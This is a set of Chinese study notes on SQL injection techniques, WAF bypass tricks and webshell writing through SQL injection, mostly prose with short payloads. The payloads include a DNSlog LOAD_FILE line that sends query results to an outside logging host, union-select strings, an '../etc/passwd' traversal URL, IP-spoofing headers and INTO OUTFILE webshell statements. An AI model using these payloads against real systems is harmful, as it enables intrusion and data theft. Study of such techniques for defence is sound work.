有时抓包后我们会发现提交的参数被加密（比如base64加密），这时我们想要注入参数就需要将我们注入更改后的参数也进行加密然后再加到参数中【因为对应的sql语句在执行时会对参数进行一次解密】同时，我们在url进行测试时同样想要进行测试注入点时也是需要对注入的语句进行加密后再添加

sqlmap工具支持对输入的参数进行加密转换

### 二次注入

二次注入是无法通过手工测试或工具等在前端网页上发现的，二次注入一般可以在我们对网站的源码进行审计时发现,这是因为二次注入是存储型注入，先输入恶意参数，数据库会对其进行储存【比如注册】，之后调用时拼接成SQL语句才会触发。因此在没有源码的情况下我们发现不了二次注入漏洞。

同时，我们在注入数据库要储存的参数时也可以通过特殊符号在实现操作时更改系统的目标【比如有一个网站可以注册账号，现在知道网站里有一个账号叫ABCD，我们可以注册一个账号`ABCD’#`，密码是`123456`，之后对我们的账号`ABCD‘#`进行密码为xxxxxx,修改时数据库会代入`ABCD’#`组成条件SQL语句（eg:update user set password='`xxxxxx`' where username='`ABCD'#`' and password='`123456`'  ),此时#会将后面的‘注释掉，语句就会认为username为ABCD，则此时我们就是对ABCD这个用户修改密码，即修改密码时的输入的账户是ABCD’#，但实际修改的是ABCD用户的密码】

- 假如网页对输入字符的长度有限制，我们可以右键检查表单或抓包寻找长度限制的值并对其修改【比如maxlength=2048改成maxlength=999999999】，这叫突破前端长度限制，但如果是后端限制【数据库会对注入的参数进行长度检查并过滤】就无法突破了

原理：

![](C:\Users\19746\Desktop\网络安全\图片\sql二次注入原理.png)

###  DNSlog带外注入

前提是该注入点是高权限的【eg:MYSQL是root权限】，因为这个注入要用到文件读写操作的权限。

[SQL注入学习-Dnslog盲注 - 笑花大王 - 博客园 (cnblogs.com)](https://www.cnblogs.com/xhds/p/12322839.html)

- Dnslog就是存储在DNS Server上的域名信息，它记录着用户对域名www.test.com、t00ls.com.等的访问信息。

- 使用DnsLog盲注仅限于windos环境

该注入需要用到一个网站：http://ceye.io/

**原理**：

DNSlog带外注入的目标是查看ns服务器上的dns日志，从而获取到数据库的用户值。首先在注入点注入特殊的语句：

~~~sql
select load_file(concat('\\\\','攻击语句',.XXX.ceye.io\\abc))
~~~

首先数据库会去执行concat语句，由concat函数将执行结果与XXX.ceye.io\\abc拼接，构成一个新的域名。然后select load_file()可以发起请求，那么这一条带有数据库查询结果的域名就被提交到DNS服务器进行解析。

此时，如果我们可以查看DNS服务器上的Dnslog就可以得到SQL注入结果。那么我们如何获得这条DNS查询记录呢？注意注入语句中的**`ceye.io`**，这其实是一个开放的Dnslog平台（具体用法在官网可见），在[http://ceye.io](http://ceye.io/)上我们可以获取到有关`ceye.io`的DNS查询信息。实际上在域名解析的过程中，是由顶级域名向下逐级解析的，我们构造的攻击语句也是如此，当它发现域名中存在`ceye.io`时，它会将这条域名信息转到相应的NS服务器上，而通过[http://ceye.io](http://ceye.io/)我们就可以查询到这条DNS解析记录。





and ` LOAD_FILE(CONCAT('\\\',(select database(),'网站Identifier给的地址\\abc')))`

以上语句是对有回显的网站查看数据库名的。以上这句话的意思是首先通过concat函数将select函数查询到的数据库名与dnslog的地址用\进行拼接组成新的域名，然后load_file函数会在把这条域名提交给DNS服务器进行解析.而DNS的DNSlog会记录，而该网站会对他的DNS服务器上的DNSlog进行公开，因此load_file函数访问这个网站提交的结果可以在这个网站上查询到。

- 小迪的语句：![](C:\Users\19746\Desktop\网络安全\图片\屏幕截图 2023-06-12 210001.png)

- 小迪给的工具在小迪视频第17天的55分钟，懒得下载。
- 由于DNS带外注入的原理，DNSlog可以解决盲注后不能回显数据的或盲注效率低的情况

### 堆叠注入

原理是基于SQL语法的;作用,数据库如果收到`语句1；语句2`这样的格式，就会将两个语句都执行，而堆叠注入的原理就是在网站本来接受语句1中的参数位置上注入`；语句2`，这样数据库就会执行我们注入的语句，即我们将多条语句堆叠到一起注入到传入的参数中。

- 由于是执行我们注入的语句，所以各种语句都行，范围十分广泛，思路要打开，最基础的是查询人家的数据，在比如我们直接自己加一个账户密码等等。
- 堆叠注入不是每一个数据库都支持的，比如MYSQL支持，但MSSQL和ORACLE就不支持

### 宽字节注入

用于绕过魔术引号，采用hex(16进制)编码绕过因为对路径进行编码之后魔术引号不会再对其生效也就是说绕过了魔术引号的作用达到绕过。【把路径换成16进制编码】【宽字节绕过】

## WAF绕过

![](C:\Users\19746\Desktop\markdown笔记\图片\屏幕截图 2023-06-14 195542.png)

- 对一个网站尝试waf绕过时，最常用的方法是自己写一个FUZZ绕过脚本结合实际情况测试来尝试绕过。

### 更改提交方式绕过

在url注入参数时被过滤后，方式绕过是一种可以尝试的方法，更改参数的提交方式有可能会绕过WAF防护

- 成功绕过WAF防护网站返回了页面，可是为什么返回的页面不正常？
  可能是后端的SQL语句只接收一种提交方式所提交的参数，我们用的提交方式它不会使用或不会接收

  【比如后台写的就是`if(isset{$_GET['id']})`,那它就只使用用GET方式提交的参数，我们为了绕过GET方式的WAF检测而采用POST方式提交的参数传参给了`$_POST`,因此便无法正常执行，返回错误。但如果后台写的是if(isset{$_REQUEST['id']})，由于request是无论是GET提交还是POST提交都接收，所以就可以执行。因此方式绕过的前提是我们绕过后的方式人家接受】

### 对提交数据变异：

1.对关键词进行大小写变化尝试绕过。2.对字符串进行数据库支持解密的加密后传入尝试绕过。3.对字符串进行base64等编码后传入尝试绕过。4.用等价函数绕过函数名关键字防护。5.对字符串用特殊符号进行伪装尝试绕过。6.在对方数据库支持反序列化的条件下以反序列化格式提交参数尝试绕过。7.用注释符对字符串进行伪装或直接注释掉过滤语句。

- `!=`=`<>` `or`=`||` `and`=`&&`

- ![](C:\Users\19746\Desktop\markdown笔记\图片\屏幕截图 2023-07-11 182852.png)
- 注意：数据变异的每个方法不是独立开来一个一个尝试的，我们进行数据变异时往往需要在一条语句上结合多种方法，甚至一种方法中中包含另一种方法
- [小迪安全学习笔记--第19天web漏洞-深入WAF注入绕过_登录列表漏洞wsf_铁锤2号的博客-CSDN博客](https://blog.csdn.net/zr1213159840/article/details/122083470?ops_request_misc=&request_id=&biz_id=102&utm_term=小迪第19&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-122083470.142^v88^insert_down28v1,239^v2^insert_chatgpt&spm=1018.2226.3001.4187)

### 其它：

#### 参数污染

原理：

![](C:\Users\19746\Desktop\网络安全\图片\屏幕截图 2023-07-11 163243.png)

Last-最后一个参数值；First:第一个参数值。。。。。。

上面的图片说明的是不同服务器在获取传入的参数值时所使用的函数以及在面对多个参数值时会选择哪一个【比如PHP的WEB服务器，对方网站上只要你传入一个参数x,但你写入的却是x=1&x=5;那么此时传入的参数值最后就是5。

而安全狗却会将多个参数都接收并匹配检测，因此就会与WEB接收的参数产生偏差，而参数污染就是利用这一漏洞

eg:我们传入参数`？id=1/**&id=-1 union select 1,2,3#*/`,服务器接收的参数是id=-1 union select 1,2,3。（#注释掉了后面的`*/`)而安全狗接收到的是`id=1/**&id=-1 union select 1,2,3#*/`，由于/***/是一种注释符，因此安全狗接收到这个参数后就不会对`/**&id=-1 union select 1,2,3#*/`这串未执行的字符串进行检测，因此最终安全狗只检测了参数1，但我们传入WEB服务器的参数是id=-1 union select 1,2,3

#### FUZZ

在对网站过滤规则不清楚的情况下，用自己根据网站特点编写的脚本或工具暴力破解的思路被称为FUZZ

### 防护软件

- 先方式绕过，无效说明对方拦截数据，则进行数据变异
- 市面上常见的 waf 产品：阿里云，宝塔，安全狗

阿里云：在阿里云处购买的服务器都自带防护

宝塔：用宝塔一键化搭建的网站都自带防护

安全狗：免费，也是自带防护

#### 安全狗

安全狗在部署后会启用默认设置，默认设置下一些防护会处于关闭状态，如果开启，网站会变的更加的敏感，好处是可以拦截更多方式的攻击，坏处是可能拦截无辜请求。为了防止过多的误报，所以安全狗默认设置下会关闭一些防护。

安全狗有网站防护，资源防护，ip黑白名单，防护日志等多个功能，想要绕过就需要采用多种方式，比如网站防护有HTTP安全检测，会默认自带官方的一些检测规则，也可以后天自己手动加入。【这里举个例子，比如HTTP安全检测自带官方的url防止复杂and和or方式注入规则，就会对我们在网站上url注入的正好符合过滤规则的and和or的语句进行过滤，但是这里就有一个漏洞，他只对url检测，不检测COOKIE,POST,HTTP头等，那么我们就可以通过这些方式来绕过这一过滤，这就涉及到WAF绕过的方式绕过了】

- 有攻击就会有防守，一些老旧的攻击工具可能就会被人家专门针对它涉及的规则过滤掉。

- 安全狗的WAF防护都是通过规则过滤防护一种特定的攻击方式，因此我们想要绕过就需要对攻击方式进行变通或用它没登记的方式攻击。

#####  以开启默认安全狗防护的sqliabs-less2为例：

​    开始测试注入点，我们首先在url处开始id = 1, 页面正常，然后id=1 and 1=1，页面显示被拦截。说明安全狗对url【GET方式提交】的and 1=1有过滤，我们可以尝试更换提交方式，更换成POST方式后提交参数发现页面不再被拦截，说明绕过成功。（但此时页面返回错误，根据less2的数据库源码审计发现它只接收GET方式提交的参数，说明虽然我们成功绕过了GET提交参数的检测成功传入了参数，但人家不接收此参数）。这里举另一种结果以便后续步骤继续，假设对方数据库采用request传参，则POST方式提交的参数对方也接收，则此时页面应该返回正常。则继续下一步，当进行到`id=-1 union select 1,database(),3#`这一步时，我们发现页面再次被拦截，查询安全狗设置后发现安全狗有对post提交方式中对数据库查询操作的拦截（这里继续假设对方没有开启对POST提交方式中对数据库查询操作的拦截，则页面继续返回正常），我们继续更改提交发式，最后发现所有提交方式对数据库查询的操作都被拦截，说明此时对方拦截的数据，查询安全狗后得知对方对database()这一关键词进行过滤，更改提交方式无效，就需要更改提交数据【即变异】，我们把关键字用注释符进行伪装：`id=-1 union select 1,database/**/(),3#`【MYSQL数据库中，`/**/`是一种伪装时常用的无用注释符，/**/不是哪里都可以用的，可以去网上查一下用法】。

​    回到最开始的假设，我们现在除去假设，对方网站就是只认GET方式提交的参数，我们无法通过更换提交方式绕过检测，只能去提交GET参数，此时我们需要的就是绕过对方对数据的检测过滤规则，比如对方有对联合查询【union select关键词】的过滤，我们就需要对union select进行伪装，mysql数据库可以把其伪装成union #a select 1,2,3#。【mysql数据库检测关键词时会将#认为语句结束的位置，因此对方会检测到关键词union，与union select不符，所以不会过滤；就算假设他仍然检测，检测的最终结果也是union a select，依然可以绕过检测】

### 其他绕过方式：

#### 伪造白名单绕过：

客户端一般不会对白名单ip地址发送的内容进行拦截，如果获取了对方客户端ip的白名单，我们可以尝试把自己的ip地址伪造成白名单里的ip地址

- 伪造白名单绕过这一方法一般不适用，因为大多数网站采用接受检测ip地址的方式是从网络层检测，这里无法伪造，因此除非确定对方网站采用的是通过脚本接收ip地址，否则不适用

##### 如何获取对方白名单？

方法一：得知网站本身的ip地址，可以尝试就去把自己的ip地址伪造成网站的ip地址，用网站本身的ip地址访问网站，自己放访问自己，一般不会被拦截，即网站本身的ip地址一般是默认白名单，可以尝试

##### 伪造方式？

抓取数据包后在数据包的数据头修改：

x-forwarded-for

x-remote-IP

x-originating-IP

x-remote-addr

x-Real-ip

#### 伪造静态资源绕过：

网站有时为了节省资源，只会设置对网站传入的一些特定文件格式进行检测【如对有.php后缀名的文件进行检测，因为.php后缀的文件一般是脚本，里面有参数，需要设置过滤。】但不会对一些无危害文件进行检测【比如不会对.jpg格式的图片文件进行检测，应为图片文件不能写入代码，不会产生危害。一般这种不被检测，没有危害不能被修改的文件格式叫做静态资源】，此时我们便可以通过对我们想要传入的文件后缀名进行修改，伪造成静态资源使其绕过检测。

eg：index.php?id=1 and 1=1 被拦截。index.php/x.txt?id=1 and 1=1 不被拦截

#### 伪造url白名单绕过：

为了防止误拦，部分waf内置默认的白名单列表，如acmin/managerl system等管理后台。只要url中存在白名单的字符串，就作为白名单不进行检测。我们可以在注入时修改url使其访问白名单文件，之后传入参数时网站就不会对其检测。

常见的uzl构造姿势:

http://10.s.s.201/=ql.php/admin.php?id=1
http://10.9.9.201/sql.php?a=/manage/&b=../etc/passwd
http://10.9.s.201/../../../manage/../sql.asp?id=2

waf通过/manage/"进行比较，只要uri中存在/manage/就作为白名单不进行检测，这样我们可以通过/sql.php?a=/ manage/&b=../etc/passwcl绕过防御规则。

#### 伪造爬虫白名单绕过：

伪造成对面搜索引擎【爬虫，比如百度，360等】白名单中的一员进行访问，网站会放行。一般用FUZZ方法来实现伪造爬虫白名单绕过

waf识别爬虫的方式？

一般为两种，一是根据UserAgent，二是根据行为

#### 根据数据库特性进行绕过

eg:mysql数据库有一条特性，对语句`/*50001 语句*/`不会绝对注释掉，而是在判断当前MySQL数据库版本是否大于5.00.01，如果大于，则该语句执行。但是waf检测时会认为`/* */`中的语句被注释掉了，不会对其进行检测，因此便可以绕过检测。

#### SQLMAP绕过注入时脚本的使用:

像安全狗，阿里云盾防等WAF防护软件通常会对直接的注入语句进行拦截，因此我们采用工具时需要对语句进行伪装

以sqlmap为例，sqlmap有一个特定的插件库tamper【自带绕过脚本】,专门用于绕过检测：

[sqlmap的使用 ---- 自带绕过脚本tamper_sqlmap 单引号_wkend的博客-CSDN博客](https://blog.csdn.net/qq_34444097/article/details/82717357?ops_request_misc=&request_id=39398b8d83584e03be2a69f82ced0d13&biz_id=&utm_medium=distribute.pc_search_result.none-task-blog-2~all~koosearch~default-2-82717357-null-null.142^v88^insert_down28v1,239^v2^insert_chatgpt&utm_term=sqlmap的使用 自带绕过脚本&spm=1018.2226.3001.4187)

- 注意，使用sqlmap时发送的请求数据包中http头部user-agent会写明是sqlmap，通常waf防护软件会针对此处来过滤掉sqlmap工具的攻击流量。
- 每个防护软件针对一个工具进行防护时都会对其特有的指纹进行记录检测过滤，我们可以通过抓取自己访问网站发送的数据包和用工具访问网站时发送的数据包进行对比得出每个工具特有的指纹，然后把指纹修改绕过过滤【比如sqlmap就支持通过指令修改useragent】
- 如果工具不支持修改指纹，就需要自己写一个中转脚本在中途拦截数据包并对其进行修改

##### 流量防护

当网站开启了流量防护，我们通过工具检测一个网站时，由于通常采用的是爆破方式，短时间内快速发送大量数据，产生大量流量，流量防护就会拦截。

解决办法：

1.延迟【eg;sqlmap可以通过delay设置延迟,控制流量速度】；2.代理【随机ip】；3.伪装爬虫白名单绕过【比如修改搜索引擎蜘蛛爬虫 http 指纹头】

## sql注入getshell

一是利用outfile函数，另外一种是利用--os-shell

```
root权限，GPC关闭，知道文件路径 的前提
日志路径：var/log/mysqld.sql
select '一句话' into outfile '路径'
select '一句话' into dumpfile '路径'
```

1.into outfile

利用条件

1. 此方法利用的先决条件

- web目录具有写权限，能够使用单引号
- 知道网站绝对路径（根目录，或则是根目录往下的目录都行）
- secure_file_priv没有具体值（在mysql/my.ini中查看）

2.--os-shell

使用udf提权获取WebShell。也是通过into oufile向服务器写入两个文件，一个可以直接执行系统命令，一个进行上传文件

此为sqlmap的一个命令，利用这条命令的先决条件：

要求为数据库DBA，使用--is-dba查看当前网站连接的数据库账号是否为mysql user表中的管理员如root，是则为dba
secure_file_priv没有具体值
知道网站的绝对路径

原文路径：[sql注入getshell的几种方式-CSDN博客](

# CTF

